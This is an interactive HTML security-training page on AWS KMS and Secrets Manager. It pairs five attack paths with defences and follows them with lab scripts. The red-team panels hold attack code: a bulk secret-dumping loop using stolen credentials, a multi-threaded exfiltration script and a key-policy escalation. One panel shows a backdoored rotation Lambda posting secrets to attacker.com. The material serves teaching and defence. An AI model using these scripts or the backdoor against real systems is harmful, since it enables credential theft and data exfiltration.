<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWS KMS & Secrets Manager - Sections 6-7 (Interactive)</title>
    <link rel="stylesheet" href="appsec-theme.css">
</head>
<body>
    <div class="container">
        <header style="margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 3px solid var(--color-primary);">
            <h1>üîê AWS KMS & Secrets Manager</h1>
            <p style="color: var(--text-secondary); font-size: 1.1rem; margin-top: 0.5rem;">
                Sections 6-7: Attack Paths & Practical Simulation (Interactive)
            </p>
        </header>

        <!-- Section 6: Common Weaknesses -->
        <section class="card">
            <div class="card-header">6. Common Weaknesses, Pitfalls & Attack Paths</div>
            
            <div class="callout callout-danger">
                <strong>üéØ Penetration Testing Mindset:</strong> This section provides concrete attack paths you can use 
                during security assessments, red team exercises, or design reviews. Each attack includes payloads, 
                misconfig patterns, and detection strategies.
            </div>

            <h3>Attack Path 1: Encryption Context Bypass (Horizontal Privilege Escalation)</h3>

            <div id="attack1-flow"></div>

            <div id="attack1-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">Interactive Vulnerable App Simulator</h4>
            <div id="vuln-app-kms"></div>

            <h4 style="margin-top: 2rem;">Configuration Comparison: Vulnerable vs Secure</h4>
            <div id="config-diff-1"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 2: AWS Managed Key Downgrade Attack</h3>

            <div id="attack2-flow"></div>

            <div id="attack2-toggle" style="margin-top: 1rem;"></div>

            <div class="callout callout-warning" style="margin-top: 1rem;">
                <strong>Key Insight:</strong> AWS Managed Keys seem convenient, but they eliminate your ability to:
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>Enforce encryption context via key policy conditions</li>
                    <li>Grant cross-account access</li>
                    <li>Control rotation schedule</li>
                    <li>Delete the key when needed</li>
                </ul>
            </div>

            <h4 style="margin-top: 2rem;">Key Type Comparison</h4>
            <div id="config-diff-2"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 3: Rotation Lambda Compromise (Supply Chain)</h3>

            <div id="attack3-flow"></div>

            <div id="attack3-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">Lambda Security Configuration</h4>
            <div id="config-diff-3"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 4: CloudTrail Blind Spot Exploitation</h3>

            <div id="attack4-flow"></div>

            <div class="alert alert-danger" style="margin-top: 1rem;">
                <strong>The Time Window Problem:</strong>
                <ul style="margin-left: 1.5rem;">
                    <li>CloudTrail events: 5-15 minute delay</li>
                    <li>S3 log delivery: +5-10 minutes</li>
                    <li>SIEM ingestion: +5-10 minutes</li>
                    <li>Alert rule execution: +5 minutes (scheduled)</li>
                    <li><strong>Total: 20-40 minutes before alert fires</strong></li>
                </ul>
                <p style="margin-top: 0.5rem;">
                    Attacker can exfiltrate hundreds of secrets in 60 seconds using multi-threading.
                </p>
            </div>

            <div id="attack4-toggle" style="margin-top: 1rem;"></div>

            <hr style="margin: 2rem 0;">

            <h3>Attack Path 5: Key Policy Privilege Escalation</h3>

            <div id="attack5-flow"></div>

            <div id="attack5-toggle" style="margin-top: 1rem;"></div>

            <h4 style="margin-top: 2rem;">IAM Policy Comparison</h4>
            <div id="config-diff-4"></div>

            <hr style="margin: 2rem 0;">

            <h3>Security Log Analyzer - Detect These Attacks</h3>
            <div id="log-analyzer"></div>

            <hr style="margin: 2rem 0;">

            <h3>"Looks Safe But Isn't" Patterns - Interactive Quiz</h3>
            <div id="security-quiz"></div>

        </section>

        <!-- Section 7: Practical Simulation -->
        <section class="card">
            <div class="card-header">7. Practical Simulation (Hands-On)</div>
            
            <div class="callout callout-success">
                <strong>üß™ Lab Environment Setup:</strong> These simulations can be run in an AWS sandbox account. 
                Each example is minimal but realistic enough to demonstrate the concept.
            </div>

            <h3>Simulation 1: Create CMK with Encryption Context Enforcement</h3>

            <h4>Objective</h4>
            <p>Create a KMS key that enforces tenant-based isolation via encryption context.</p>

            <div id="simulation1-flow"></div>

            <h4 style="margin-top: 2rem;">Step 1: AWS CLI Commands</h4>

            <pre><code># Create IAM roles for two tenants
aws iam create-role \
  --role-name app-tenant-acme \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "lambda.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }'

# Tag role with tenant ID
aws iam tag-role \
  --role-name app-tenant-acme \
  --tags Key=tenant_id,Value=acme

# Create Customer Managed Key with encryption context enforcement
aws kms create-key \
  --description "Tenant isolation key" \
  --key-policy '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "Enable IAM User Permissions",
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
        "Action": "kms:*",
        "Resource": "*"
      },
      {
        "Sid": "Allow tenant roles with matching context",
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::123456789012:role/app-tenant-acme"
        },
        "Action": ["kms:Decrypt", "kms:DescribeKey"],
        "Resource": "*",
        "Condition": {
          "StringEquals": {
            "kms:EncryptionContext:tenant_id": "${aws:PrincipalTag/tenant_id}",
            "kms:EncryptionContext:environment": "production"
          }
        }
      }
    ]
  }'
</code></pre>

            <h4>Step 2: Test Encryption Context Validation</h4>

            <div id="crypto-playground"></div>

            <h4 style="margin-top: 2rem;">Step 3: Python Test Script</h4>

            <pre><code>import boto3
import json

kms_client = boto3.client('kms', region_name='us-east-1')
KEY_ID = 'alias/app-prod-tenant-isolation'

# Test 1: Encrypt data for tenant-acme
print("[*] Test 1: Encrypting data for tenant-acme...")

plaintext = json.dumps({"username": "admin", "password": "secret123"})
encryption_context = {
    "tenant_id": "acme",
    "environment": "production"
}

response = kms_client.encrypt(
    KeyId=KEY_ID,
    Plaintext=plaintext.encode(),
    EncryptionContext=encryption_context
)

ciphertext_acme = response['CiphertextBlob']
print(f"[+] Encrypted successfully. Ciphertext length: {len(ciphertext_acme)} bytes")

# Test 2: Decrypt with correct context (should succeed)
print("\n[*] Test 2: Decrypting with CORRECT context...")

try:
    response = kms_client.decrypt(
        CiphertextBlob=ciphertext_acme,
        EncryptionContext=encryption_context
    )
    plaintext_result = response['Plaintext'].decode()
    print(f"[+] SUCCESS: Decrypted: {plaintext_result}")
except Exception as e:
    print(f"[-] FAILED: {str(e)}")

# Test 3: Decrypt with wrong context (should fail)
print("\n[*] Test 3: Decrypting with WRONG context (tenant_id=globex)...")

wrong_context = {
    "tenant_id": "globex",
    "environment": "production"
}

try:
    response = kms_client.decrypt(
        CiphertextBlob=ciphertext_acme,
        EncryptionContext=wrong_context
    )
    print("[-] SECURITY ISSUE: Decryption succeeded with wrong context!")
except kms_client.exceptions.InvalidCiphertextException:
    print("[+] SECURE: Decryption correctly failed (InvalidCiphertextException)")
except Exception as e:
    print(f"[?] Unexpected error: {str(e)}")
</code></pre>

            <div class="callout callout-success" style="margin-top: 1rem;">
                <strong>Expected Outcome:</strong>
                <ul style="margin-left: 1.5rem;">
                    <li>‚úÖ Test 2: Decryption succeeds with matching context</li>
                    <li>‚úÖ Test 3: <code>InvalidCiphertextException</code> with wrong context</li>
                    <li>üìä CloudTrail logs show encryption context in all API calls</li>
                </ul>
            </div>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 2: Secrets Manager with Automatic Rotation</h3>

            <h4>Objective</h4>
            <p>Create a secret, configure automatic rotation, and observe the rotation process.</p>

            <div id="simulation2-flow"></div>

            <h4 style="margin-top: 2rem;">Setup Commands</h4>

            <pre><code># 1. Create secret with CMK
aws secretsmanager create-secret \
  --name lab/db/postgres/master \
  --description "PostgreSQL master password for lab" \
  --kms-key-id alias/app-prod-tenant-isolation \
  --secret-string '{
    "username": "postgres",
    "password": "InitialP@ssw0rd123!",
    "host": "lab-db.us-east-1.rds.amazonaws.com",
    "port": 5432,
    "database": "labdb"
  }'

# 2. Configure automatic rotation
aws secretsmanager rotate-secret \
  --secret-id lab/db/postgres/master \
  --rotation-lambda-arn arn:aws:lambda:us-east-1:123:function:lab-secrets-rotation \
  --rotation-rules AutomaticallyAfterDays=30

# 3. Trigger immediate rotation for testing
aws secretsmanager rotate-secret \
  --secret-id lab/db/postgres/master
</code></pre>

            <h4 style="margin-top: 2rem;">Interactive JWT Decoder - Understanding Secret Versioning</h4>
            <p>Secrets Manager uses staging labels (AWSCURRENT, AWSPENDING, AWSPREVIOUS) to manage versions. 
            This is conceptually similar to how JWT tokens have claims. Try decoding a sample secret metadata:</p>
            
            <div id="jwt-analyzer"></div>

            <h4 style="margin-top: 2rem;">Rotation Monitoring Script</h4>

            <pre><code>import boto3
import json
import time

secrets_client = boto3.client('secretsmanager', region_name='us-east-1')
SECRET_ID = 'lab/db/postgres/master'

print("[*] Monitoring secret versions during rotation...")
print("-" * 60)

for i in range(10):  # Poll for 50 seconds
    try:
        # Get current version
        current = secrets_client.get_secret_value(
            SecretId=SECRET_ID,
            VersionStage='AWSCURRENT'
        )
        
        # Try to get pending version
        try:
            pending = secrets_client.get_secret_value(
                SecretId=SECRET_ID,
                VersionStage='AWSPENDING'
            )
            pending_exists = True
        except secrets_client.exceptions.ResourceNotFoundException:
            pending_exists = False
        
        # Display status
        current_dict = json.loads(current['SecretString'])
        current_password = current_dict['password'][:12] + "..."
        
        print(f"\nIteration {i+1}:")
        print(f"  AWSCURRENT version: {current['VersionId'][:8]}")
        print(f"  AWSCURRENT password: {current_password}")
        
        if pending_exists:
            pending_dict = json.loads(pending['SecretString'])
            pending_password = pending_dict['password'][:12] + "..."
            print(f"  AWSPENDING version: {pending['VersionId'][:8]}")
            print(f"  AWSPENDING password: {pending_password}")
            print("  ‚ö†Ô∏è  Rotation in progress!")
        else:
            print("  ‚úÖ No pending rotation")
        
    except Exception as e:
        print(f"  Error: {str(e)}")
    
    time.sleep(5)

print("\n[*] Monitoring complete.")
</code></pre>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 3: API Security Testing - Rate Limiting & Auth</h3>

            <h4>Objective</h4>
            <p>Test rate limiting on Secrets Manager API to understand throttling and detection mechanisms.</p>

            <div id="api-tester"></div>

            <h4 style="margin-top: 2rem;">Password Strength for Rotation Lambda</h4>
            <p>When implementing rotation, ensure generated passwords meet security requirements:</p>

            <div id="password-meter"></div>

            <hr style="margin: 2rem 0;">

            <h3>Simulation 4: Input Validation - Encryption Context Sanitization</h3>

            <h4>Objective</h4>
            <p>Test proper sanitization of encryption context values to prevent injection attacks.</p>

            <div id="validation-trainer"></div>

            <div class="alert alert-warning" style="margin-top: 1rem;">
                <strong>Security Note:</strong> Encryption context values are logged in CloudTrail. Never put sensitive 
                data (passwords, PII, secrets) in encryption context. Use non-sensitive identifiers like tenant IDs, 
                environment names, or resource ARNs.
            </div>

            <h4 style="margin-top: 2rem;">Example: Validating Tenant ID in Encryption Context</h4>

            <pre><code>import re

def validate_tenant_id(tenant_id):
    """
    Validate tenant ID before using in encryption context.
    Must be alphanumeric + hyphens only.
    """
    pattern = r'^[a-zA-Z0-9-]{1,64}$'
    
    if not re.match(pattern, tenant_id):
        raise ValueError(f"Invalid tenant_id: {tenant_id}")
    
    # Additional checks
    if tenant_id.startswith('-') or tenant_id.endswith('-'):
        raise ValueError("tenant_id cannot start/end with hyphen")
    
    return tenant_id

# Usage in encryption
tenant_id = validate_tenant_id(user_input)  # Sanitize first!

encryption_context = {
    "tenant_id": tenant_id,
    "environment": "production"
}

response = kms_client.encrypt(
    KeyId=key_id,
    Plaintext=secret_value.encode(),
    EncryptionContext=encryption_context
)
</code></pre>

        </section>

        <div class="alert alert-info" style="margin: 2rem 0; text-align: center;">
            <strong>üìö End of Sections 6-7</strong>
            <p style="margin-top: 0.5rem;">Common Weaknesses & Attack Paths and Practical Simulation complete.</p>
            <p>Ready to proceed to Sections 8-9 (Defense/Mitigation and Implementation)?</p>
        </div>

    </div>

    <script src="appsec-theme.js"></script>
    <script src="appsec-widgets.js"></script>
    <script>
        // ========================================
        // Section 6: Attack Path Visualizations
        // ========================================

        // Attack Path 1: Encryption Context Bypass
        AppSecWidgets.FlowVisualizer.create('attack1-flow', [
            {
                title: "1. SSRF Vulnerability",
                description: "Attacker exploits SSRF in image processing endpoint to access EC2 metadata service"
            },
            {
                title: "2. Steal IAM Credentials",
                description: "Retrieve temporary credentials from http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
            {
                title: "3. Enumerate Secrets",
                description: "Use stolen credentials to call secretsmanager:ListSecrets, discover multi-tenant structure"
            },
            {
                title: "4. Test Access Control",
                description: "Attempt GetSecretValue for other tenants' secrets (horizontal privilege escalation)"
            },
            {
                title: "5. Bypass Success",
                description: "If no encryption context enforcement: decrypt ALL tenant secrets, exfiltrate data"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack1-toggle',
            'Encryption Context Bypass',
            `
                <h4>üî¥ Attack Perspective (Red Team)</h4>
                <pre><code>import boto3
import json

# Attacker has stolen credentials from SSRF
session = boto3.Session(
    aws_access_key_id='ASIA...',
    aws_secret_access_key='...',
    aws_session_token='...'
)

secrets = session.client('secretsmanager')

# List all secrets
response = secrets.list_secrets()
print(f"[*] Found {len(response['SecretList'])} secrets")

# Try to access other tenants' secrets
for secret in response['SecretList']:
    try:
        value = secrets.get_secret_value(SecretId=secret['Name'])
        print(f"[+] COMPROMISED: {secret['Name']}")
        print(f"    Data: {value['SecretString'][:50]}...")
    except Exception as e:
        print(f"[-] Blocked: {secret['Name']}")
</code></pre>
                <p><strong>Result:</strong> Without encryption context enforcement, attacker retrieves all 500 tenant secrets.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense Perspective (Blue Team)</h4>
                <p><strong>Detection Signals:</strong></p>
                <ul>
                    <li><strong>CloudTrail:</strong> Unusual volume of <code>secretsmanager:GetSecretValue</code> from single principal</li>
                    <li><strong>Pattern:</strong> Role accesses secrets outside its normal tenant scope</li>
                    <li><strong>Time-of-day:</strong> API calls during off-hours (3 AM)</li>
                    <li><strong>Source IP:</strong> Requests from unexpected IP ranges</li>
                </ul>
                <p><strong>Mitigation - Enforce Encryption Context in Key Policy:</strong></p>
                <pre><code>{
  "Effect": "Allow",
  "Action": "kms:Decrypt",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:tenant_id": "\${aws:PrincipalTag/tenant_id}"
    }
  }
}</code></pre>
                <p><strong>Result:</strong> Role tagged <code>tenant_id=acme</code> can ONLY decrypt secrets with matching context.</p>
            `
        );

        // Attack Path 2: AWS Managed Key Downgrade
        AppSecWidgets.FlowVisualizer.create('attack2-flow', [
            {
                title: "1. Developer Convenience",
                description: "Developer creates secret without specifying KMS key (defaults to aws/secretsmanager)"
            },
            {
                title: "2. No Custom Policies",
                description: "AWS Managed Key = no encryption context support, no custom key policy conditions"
            },
            {
                title: "3. Compromise Low-Priv Role",
                description: "Attacker gains access to role with secretsmanager:GetSecretValue permission"
            },
            {
                title: "4. Unrestricted Access",
                description: "Retrieve ANY secret - no tenant-specific validation possible"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack2-toggle',
            'AWS Managed Key Limitations',
            `
                <h4>üî¥ Attack: Leveraging AWS Managed Keys</h4>
                <pre><code># Attacker with secretsmanager:GetSecretValue permission

# List high-value secrets
aws secretsmanager list-secrets | grep -E 'stripe|admin|aws_access'

# Retrieve Stripe API key (uses aws/secretsmanager)
aws secretsmanager get-secret-value \
  --secret-id prod/api-key/stripe

# ‚úÖ Success! No encryption context to block access
# Result: {"api_key": "sk_live_abc123..."}</code></pre>
                <p><strong>Impact:</strong> Attacker with any <code>GetSecretValue</code> permission can access high-value secrets.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Enforce Customer Managed Keys</h4>
                <p><strong>Service Control Policy (SCP) to Block AWS Managed Keys:</strong></p>
                <pre><code>{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "RequireCustomerManagedKeys",
    "Effect": "Deny",
    "Action": [
      "secretsmanager:CreateSecret",
      "secretsmanager:PutSecretValue"
    ],
    "Resource": "*",
    "Condition": {
      "StringNotLike": {
        "secretsmanager:KmsKeyId": "arn:aws:kms:*:*:key/*"
      }
    }
  }]
}</code></pre>
                <p><strong>Result:</strong> All secrets MUST use Customer Managed Keys with proper encryption context.</p>
            `
        );

        // Attack Path 3: Rotation Lambda Compromise
        AppSecWidgets.FlowVisualizer.create('attack3-flow', [
            {
                title: "1. Vulnerable Dependency",
                description: "Rotation Lambda uses outdated npm package (lodash 4.17.19) with prototype pollution"
            },
            {
                title: "2. RCE in Lambda",
                description: "Attacker exploits vulnerability to achieve remote code execution"
            },
            {
                title: "3. Inject Backdoor",
                description: "Modify Lambda to exfiltrate secrets during every rotation"
            },
            {
                title: "4. Persistent Access",
                description: "Every 30 days, new passwords automatically sent to attacker's server"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack3-toggle',
            'Supply Chain Attack on Rotation Lambda',
            `
                <h4>üî¥ Attack: Malicious Lambda Code</h4>
                <pre><code>// Injected into rotation Lambda
import requests

def lambda_handler(event, context):
    # Normal rotation logic
    pending_secret = get_secret_value('AWSPENDING')
    
    # üö® BACKDOOR: Exfiltrate to attacker server
    requests.post(
        'https://attacker.com/exfil',
        json={
            'secret': pending_secret,
            'arn': event['SecretId']
        }
    )
    
    # Continue rotation to avoid detection
    set_secret(pending_secret)
    test_secret(pending_secret)
    finish_secret()
    
    return {'statusCode': 200}
</code></pre>
                <p><strong>Impact:</strong> Attacker gets new password every rotation cycle, maintains persistent access.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Lambda Network Isolation</h4>
                <p><strong>Prevention Measures:</strong></p>
                <ol>
                    <li><strong>No Internet Access:</strong> Lambda in private subnet, NO NAT Gateway</li>
                    <li><strong>VPC Endpoints:</strong> Use VPC endpoint for Secrets Manager API</li>
                    <li><strong>Security Group:</strong> Only allow egress to RDS (port 5432)</li>
                    <li><strong>Dependency Scanning:</strong> <code>npm audit</code> + Snyk in CI/CD</li>
                    <li><strong>Code Integrity:</strong> Hash Lambda package, alert on changes</li>
                </ol>
                <p><strong>Detection:</strong></p>
                <ul>
                    <li>VPC Flow Logs alert on Lambda ‚Üí public IP connections</li>
                    <li>GuardDuty detects unusual Lambda network activity</li>
                    <li>CloudWatch Logs monitored for unexpected DNS queries</li>
                </ul>
            `
        );

        // Attack Path 4: CloudTrail Blind Spot
        AppSecWidgets.FlowVisualizer.create('attack4-flow', [
            {
                title: "1. Gain Credentials",
                description: "SSRF, phishing, or stolen laptop - attacker gets temporary IAM credentials (15 min TTL)"
            },
            {
                title: "2. Rapid Exfiltration",
                description: "Multi-threaded script pulls 500 secrets in < 60 seconds"
            },
            {
                title: "3. CloudTrail Delay",
                description: "Events appear in logs 5-15 minutes later (too late)"
            },
            {
                title: "4. Credentials Expire",
                description: "Temporary credentials expire before detection, attacker untraceable"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack4-toggle',
            'Race Against Detection',
            `
                <h4>üî¥ Attack: Blitz Exfiltration</h4>
                <pre><code>import boto3
import threading

def fetch_secret(name, results):
    try:
        secret = secrets_client.get_secret_value(SecretId=name)
        results.append({name: secret['SecretString']})
    except: pass

# Spawn 50 threads, pull 500 secrets
results = []
threads = []
for secret_name in secret_list:  # ~500 secrets
    t = threading.Thread(target=fetch_secret, args=(secret_name, results))
    t.start()
    threads.append(t)

for t in threads: t.join()

# Complete in 60 seconds, CloudTrail won't alert for 20+ minutes
print(f"[+] Exfiltrated {len(results)} secrets in 60 seconds")
</code></pre>
                <p><strong>Timeline:</strong> Attack complete before CloudTrail ‚Üí S3 ‚Üí SIEM ‚Üí Alert chain finishes.</p>
            `,
            `
                <h4>üõ°Ô∏è Defense: Real-Time Detection</h4>
                <p><strong>EventBridge Rule for Immediate Alerting:</strong></p>
                <pre><code>{
  "source": ["aws.secretsmanager"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["GetSecretValue"],
    "errorCode": [{"exists": false}]
  }
}</code></pre>
                <p><strong>Advanced Detection:</strong></p>
                <ul>
                    <li><strong>Rate Anomaly:</strong> Alert on >10 GetSecretValue calls/minute from single principal</li>
                    <li><strong>Velocity:</strong> Multiple secrets accessed in <5 seconds (human impossible)</li>
                    <li><strong>Scope Change:</strong> Role accesses secrets outside normal patterns</li>
                    <li><strong>Response:</strong> Lambda auto-revokes suspicious credentials via IAM</li>
                </ul>
            `
        );

        // Attack Path 5: Key Policy Privilege Escalation
        AppSecWidgets.FlowVisualizer.create('attack5-flow', [
            {
                title: "1. Overly Permissive Policy",
                description: "DevOps role has kms:PutKeyPolicy permission (should be restricted)"
            },
            {
                title: "2. Compromise DevOps Role",
                description: "Attacker gains access to DevOps role credentials"
            },
            {
                title: "3. Modify Key Policy",
                description: "Grant own role unrestricted kms:* permissions"
            },
            {
                title: "4. Decrypt Everything",
                description: "Full access to all KMS-encrypted data across all services"
            }
        ]);

        AppSecWidgets.AttackDefense.create(
            'attack5-toggle',
            'Administrative Privilege Escalation',
            `
                <h4>üî¥ Attack: Policy Modification</h4>
                <pre><code># Attacker compromises role with kms:PutKeyPolicy

# Modify key policy to grant full access
aws kms put-key-policy \
  --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
  --policy-name default \
  --policy '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
      "Action": "kms:*",
      "Resource": "*"
    }]
  }'

# Now decrypt all secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    aws secretsmanager get-secret-value --secret-id "$secret"
done
</code></pre>
            `,
            `
                <h4>üõ°Ô∏è Defense: Least Privilege + MFA</h4>
                <pre><code>{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/KMSAdmin"},
  "Action": "kms:PutKeyPolicy",
  "Resource": "*",
  "Condition": {
    "IpAddress": {
      "aws:SourceIp": "10.0.0.0/8"  // Corporate network only
    },
    "Bool": {
      "aws:MultiFactorAuthPresent": "true"  // Require MFA
    }
  }
}</code></pre>
                <p><strong>Additional Controls:</strong></p>
                <ul>
                    <li>AWS Config rule to detect key policy changes</li>
                    <li>SNS alert on any kms:PutKeyPolicy event</li>
                    <li>Require approval workflow for policy changes</li>
                </ul>
            `
        );

        // ========================================
        // Configuration Comparisons
        // ========================================

        AppSecWidgets.ConfigDiff.create(
            'config-diff-1',
            `// ‚ùå VULNERABLE: No encryption context enforcement
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:role/app-backend"
  },
  "Action": "kms:Decrypt",
  "Resource": "*"
  // Missing: Condition block!
}

// Result: Role can decrypt ANY ciphertext
// encrypted with this key, regardless of tenant`,
            `// ‚úÖ SECURE: Encryption context enforced
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:role/app-backend"
  },
  "Action": "kms:Decrypt",
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:tenant_id": "\${aws:PrincipalTag/tenant_id}",
      "kms:EncryptionContext:environment": "production"
    }
  }
}

// Result: Role can ONLY decrypt secrets where
// encryption context matches role's tags`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-2',
            `// ‚ùå AWS Managed Key (Limited Control)
aws secretsmanager create-secret \\
  --name prod/api-key/stripe \\
  --secret-string "sk_live_abc123..."
  # No --kms-key-id specified
  # Defaults to aws/secretsmanager

Limitations:
- No custom key policy
- No encryption context support
- Cannot grant cross-account access
- Rotation every 3 years (cannot change)
- Cannot delete key`,
            `// ‚úÖ Customer Managed Key (Full Control)
aws secretsmanager create-secret \\
  --name prod/api-key/stripe \\
  --kms-key-id arn:aws:kms:us-east-1:123:key/abc123 \\
  --secret-string "sk_live_abc123..."

Benefits:
- Custom key policy with Conditions
- Encryption context enforcement
- Cross-account access control
- Rotation every 1 year (configurable)
- Full audit trail in CloudTrail`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-3',
            `// ‚ùå VULNERABLE: Lambda with internet access
resource "aws_lambda_function" "rotation" {
  function_name = "secrets-rotation"
  
  # Lambda in public subnet
  vpc_config {
    subnet_ids = [aws_subnet.public.id]
  }
  
  # Security group allows all egress
  # Attacker can exfiltrate via HTTPS
}

# Dependencies not pinned
# package.json:
{
  "dependencies": {
    "pg": "^8.7.1",  // ^ allows minor updates
    "lodash": "^4.17.0"  // Vulnerable version!
  }
}`,
            `// ‚úÖ SECURE: Network isolated Lambda
resource "aws_lambda_function" "rotation" {
  function_name = "secrets-rotation"
  
  # Lambda in PRIVATE subnet
  vpc_config {
    subnet_ids = [aws_subnet.private.id]
    security_group_ids = [aws_security_group.lambda.id]
  }
}

# Security group: ONLY allow RDS egress
resource "aws_security_group_rule" "lambda_egress" {
  type = "egress"
  from_port = 5432
  to_port = 5432
  protocol = "tcp"
  source_security_group_id = aws_security_group.rds.id
}

# VPC Endpoint for Secrets Manager (no internet)
# Dependencies pinned with integrity hashes
# package-lock.json enforces exact versions`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-4',
            `// ‚ùå VULNERABLE: Overly permissive IAM
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
  "Action": [
    "kms:DescribeKey",
    "kms:GetKeyPolicy",
    "kms:PutKeyPolicy"  // ‚ùå Too powerful!
  ],
  "Resource": "*"
}

// Allows DevOps to grant themselves full kms:* 
// permissions by modifying the key policy`,
            `// ‚úÖ SECURE: Least privilege + MFA
// Read-only for DevOps
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
  "Action": [
    "kms:DescribeKey",
    "kms:GetKeyPolicy"  // ‚úÖ Read-only
  ],
  "Resource": "*"
}

// Separate admin role for policy changes
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/KMSAdmin"},
  "Action": "kms:PutKeyPolicy",
  "Resource": "*",
  "Condition": {
    "Bool": {"aws:MultiFactorAuthPresent": "true"},
    "IpAddress": {"aws:SourceIp": "10.0.0.0/8"}
  }
}`
        );

        // ========================================
        // Interactive Tools
        // ========================================

        // Vulnerable App Simulator
        AppSecWidgets.VulnApp.create('vuln-app-kms');

        // Log Analyzer
        AppSecWidgets.LogAnalyzer.create('log-analyzer');

        // Security Quiz
        AppSecWidgets.Quiz.create('security-quiz', {
            title: "üß† KMS & Secrets Manager Security Quiz",
            intro: "Test your understanding of common pitfalls and secure patterns.",
            questions: [
                {
                    text: "Which KMS key type allows enforcement of encryption context via key policy conditions?",
                    options: [
                        { value: "aws-managed", label: "AWS Managed Key (aws/secretsmanager)" },
                        { value: "customer-managed", label: "Customer Managed Key", correct: true },
                        { value: "aws-owned", label: "AWS Owned Key" }
                    ]
                },
                {
                    text: "What happens if you decrypt a ciphertext with the wrong encryption context?",
                    options: [
                        { value: "access-denied", label: "AccessDeniedException (IAM policy blocked it)" },
                        { value: "invalid-ciphertext", label: "InvalidCiphertextException (cryptographic validation failed)", correct: true },
                        { value: "success", label: "Decryption succeeds (encryption context is optional)" }
                    ]
                },
                {
                    text: "During automatic rotation, which staging label represents the new password being prepared?",
                    options: [
                        { value: "current", label: "AWSCURRENT" },
                        { value: "pending", label: "AWSPENDING", correct: true },
                        { value: "previous", label: "AWSPREVIOUS" }
                    ]
                },
                {
                    text: "What is the best practice for rotation Lambda network access?",
                    options: [
                        { value: "public", label: "Public subnet with internet gateway for flexibility" },
                        { value: "private-nat", label: "Private subnet with NAT gateway" },
                        { value: "private-endpoint", label: "Private subnet with VPC endpoints (no internet)", correct: true }
                    ]
                },
                {
                    text: "If your application caches secrets, what is the recommended approach?",
                    options: [
                        { value: "forever", label: "Cache indefinitely to minimize API calls" },
                        { value: "ttl", label: "Cache with TTL (e.g., 5-10 minutes) and refresh periodically", correct: true },
                        { value: "never", label: "Never cache, retrieve on every request" }
                    ]
                }
            ]
        });

        // ========================================
        // Section 7: Practical Simulations
        // ========================================

        // Simulation 1 Flow
        AppSecWidgets.FlowVisualizer.create('simulation1-flow', [
            {
                title: "Step 1: Create IAM Roles",
                description: "Create app-tenant-acme and app-tenant-globex roles with tenant_id tags"
            },
            {
                title: "Step 2: Create CMK",
                description: "Customer Managed Key with encryption context enforcement in key policy"
            },
            {
                title: "Step 3: Test Encryption",
                description: "Encrypt data with tenant_id=acme context"
            },
            {
                title: "Step 4: Test Decryption",
                description: "Verify correct context succeeds, wrong context fails"
            },
            {
                title: "Step 5: Analyze CloudTrail",
                description: "Review logs to see encryption context in API calls"
            }
        ]);

        // Simulation 2 Flow
        AppSecWidgets.FlowVisualizer.create('simulation2-flow', [
            {
                title: "Step 1: Create Secret",
                description: "Create secret in Secrets Manager with CMK encryption"
            },
            {
                title: "Step 2: Deploy Rotation Lambda",
                description: "Package and deploy Lambda function with 4-step rotation logic"
            },
            {
                title: "Step 3: Configure Rotation",
                description: "Set rotation schedule (30 days) and trigger immediate rotation"
            },
            {
                title: "Step 4: Monitor Rotation",
                description: "Observe AWSPENDING ‚Üí AWSCURRENT transition, password changes"
            },
            {
                title: "Step 5: Verify Logs",
                description: "Check CloudWatch Logs for rotation steps, CloudTrail for API events"
            }
        ]);

        // Crypto Playground
        AppSecWidgets.CryptoPlayground.create('crypto-playground');

        // JWT Analyzer (for understanding secret versioning)
        AppSecWidgets.JWTAnalyzer.create('jwt-analyzer');

        // API Tester
        AppSecWidgets.APITester.create('api-tester');

        // Password Meter
        AppSecWidgets.PasswordMeter.create('password-meter');

        // Validation Trainer
        AppSecWidgets.ValidationTrainer.create('validation-trainer');

    </script>
</body>
</html>
